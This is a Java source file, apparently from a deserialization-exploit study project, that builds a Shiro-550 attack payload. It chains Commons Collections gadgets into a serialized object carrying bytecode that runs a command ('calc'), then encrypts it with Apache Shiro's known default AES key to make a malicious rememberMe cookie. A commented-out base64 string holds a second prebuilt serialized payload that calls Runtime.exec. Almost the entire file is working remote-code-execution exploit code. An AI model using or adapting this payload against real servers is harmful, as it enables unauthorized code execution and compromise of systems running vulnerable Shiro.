package Seri;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;

import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Shiro550CC6 {
    public static void main(String[] args) throws Exception {

        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates ,"_name" ,"xxx");
        Utils.setValue(templates ,"_class" ,null);
        Utils.setValue(templates ,"_bytecodes" ,new byte[][]{bytes});
        Utils.setValue(templates ,"_tfactory" ,new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer(
                "useServicesMechnism" ,
                null ,null
                );

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap ,transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap ,templates);

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry ,"tmpValue");

        outerMap.clear();

        Utils.setValue(transformer ,"iMethodName" ,"newTransformer");

        String payload = Utils.serialize(hashMap ,"bin/shiro550CC6.bin");
//        String payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAABuTK/rq+AAAAMwBDCgALACgJACkAKggAKwoALAAtCgAuAC8IADAKAC4AMQcAMgoACAAzBwA0BwA1AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMU2VyaS9TaGVsbENsYXNzOwEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA2AQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAMgEAClNvdXJjZUZpbGUBAA9TaGVsbENsYXNzLmphdmEMAB8AIAcANwwAOAA5AQATSGVsbG8gVGVtcGxhdGVzSW1wbAcAOgwAOwA8BwA9DAA+AD8BAARjYWxjDABAAEEBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABCACABAA9TZXJpL1NoZWxsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAoACwAAAAAABAABAAwADQADAA4AAAA/AAAAAwAAAAGxAAAAAgAPAAAABgABAAAAIwAQAAAAIAADAAAAAQARABIAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAAZAAAACQIAEwAAABUAAAABAAwAGgADAA4AAABJAAAABAAAAAGxAAAAAgAPAAAABgABAAAAKAAQAAAAKgAEAAAAAQARABIAAAAAAAEAEwAUAAEAAAABABsAHAACAAAAAQAdAB4AAwAXAAAABAABABgAGQAAAA0DABMAAAAbAAAAHQAAAAEAHwAgAAIADgAAAEwAAgABAAAAFiq3AAGyAAISA7YABLgABRIGtgAHV7EAAAACAA8AAAASAAQAAAAqAAQAKwAMACwAFQAtABAAAAAMAAEAAAAWABEAEgAAABcAAAAEAAEACAAIACEAIAABAA4AAABhAAIAAQAAABK4AAUSBrYAB1enAAhLKrYACbEAAQAAAAkADAAIAAMADwAAABYABQAAABsACQAeAAwAHAANAB0AEQAfABAAAAAMAAEADQAEACIAIwAAACQAAAAHAAJMBwAlBAABACYAAAACACd1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAPU2VyaS5TaGVsbENsYXNzAAAAAAAAAAAAAAB4cHQAA3h4eHB3AQB4cQB+AA14";
        String key = "kPH+bIxk5D2deZiIxcaaaA==";

        AesCipherService aes = new AesCipherService();
        byte[] keyBytes = Base64.getDecoder().decode(key);
        System.out.println(aes.encrypt(Base64.getDecoder().decode(payload) , keyBytes).toString());

//        Utils.unserialize("bin/shiro550CC6");

    }
}
